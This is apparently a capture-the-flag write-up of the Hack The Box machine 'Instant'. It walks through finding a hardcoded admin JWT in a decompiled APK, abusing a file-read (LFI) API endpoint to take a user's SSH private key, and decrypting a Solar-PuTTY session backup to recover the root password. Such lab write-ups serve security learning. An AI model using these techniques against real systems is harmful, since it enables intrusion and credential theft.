# Instant

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

## Port scan

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Instant Wallet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Apk

We do have a option to download apk on the webpage&#x20;

{% embed url="http://instant.htb/downloads/instant.apk" %}

### Static analysis

For static analysis, we can decompile our code. I used following website:

{% embed url="http://www.javadecompilers.com/apk" %}

There's intresting API call under `sources/com/instantlabs/instant/AdminActivities.java`

```java
public class AdminActivities {
    private String TestAdminAuthorization() {
        new OkHttpClient().newCall(new Request.Builder().url("http://mywalletv1.instant.htb/api/v1/view/profile").addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build()).enqueue(new Callback() {
            static final /* synthetic */ boolean $assertionsDisabled = false;

<<SNIP>>

//addHeader("Authorization", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA").build())
```

Feeding the jwt token to jwt.io, we get values

```json
{
  "id": 1,
  "role": "Admin",
  "walId": "f0eca6e5-783a-471d-9d8f-0162cbc900db",
  "exp": 33259303656
}
```

We can try sending req to see what data we can get through this API,

```bash
╰─➤  curl -s 'http://mywalletv1.instant.htb/api/v1/view/profile' -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' | jq 
{
  "Profile": {
    "account_status": "active",
    "email": "admin@instant.htb",
    "invite_token": "instant_admin_inv",
    "role": "Admin",
    "username": "instantAdmin",
    "wallet_balance": "10000000",
    "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
  },
  "Status": 200
}
```

Hmm, not much intresting.

```bash
╰─➤  grep -irl "instant.htb"           
resources/res/7P.xml
resources/res/8G.xml
resources/classes.dex
sources/com/instantlabs/instant/AdminActivities.java
sources/com/instantlabs/instant/TransactionActivity.java
sources/com/instantlabs/instant/LoginActivity.java
sources/com/instantlabs/instant/ProfileActivity.java
sources/com/instantlabs/instant/RegisterActivity.java

╰─➤  cat resources/res/8G.xml | grep htb
        <domain includeSubdomains="true">mywalletv1.instant.htb
        <domain includeSubdomains="true">swagger-ui.instant.htb

```

With this we can find another sub-domain, (VHOST)\


Upon visit we can see it provides API docs for the app

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

### LFI (web)

Logs section is intresting,&#x20;

There are API calls, \
1\. `/api/v1/admin/view/logs`\
2\. `/api/v1/admin/read/log`\
\
After looking at both, we can SEE it's a classic LFI.\
The `read/log` api doc revealed the username,

```javascript
  "FileName": "/home/shirohige/logs/1.log
```

<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

Let's grab ssh key,

<figure><img src="../../../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

VsCode was really helpful to clean/correct the id\_rsa key

## User shell

```bash
╰─➤  chmod 400 id_rsa       
                                                                                                                                                                                                                                               
╭─kali@dragon ~/stuff/htb/instant/unziped  
╰─➤  ssh shirohige@instant.htb -i id_rsa 
The authenticity of host 'instant.htb (10.129.94.150)' can't be established.
ED25519 key fingerprint is SHA256:r+JkzsLsWoJi57npPp0MXIJ0/vVzZ22zbB7j3DWmdiY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'instant.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
shirohige@instant:~$ id
uid=1001(shirohige) gid=1002(shirohige) groups=1002(shirohige),1001(development)
shirohige@instant:~$ 
```

## Root shell

There's a strange file in `/opt/backups/Solar-puTTY`

<figure><img src="../../../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

Upon googling what's the session file for, and it's vulnerabilites, I found this blog (and he's the author of this box)

{% embed url="https://hackmd.io/@tahaafarooq/cracking-solar-putty" %}

Converting the script for C# to python from GPT was easy, with that we can have root data

```javascript
╰─➤  python3 dec.py
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "12**24nzC!r0c%q12",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}                                              
```

### Root password

```javascript
"Username": "root",
"Password": "12**24nzC!r0c%q12"
```

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ su - root
Password: 
root@instant:~# id
uid=0(root) gid=0(root) groups=0(root)
root@instant:~# 
```

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning.
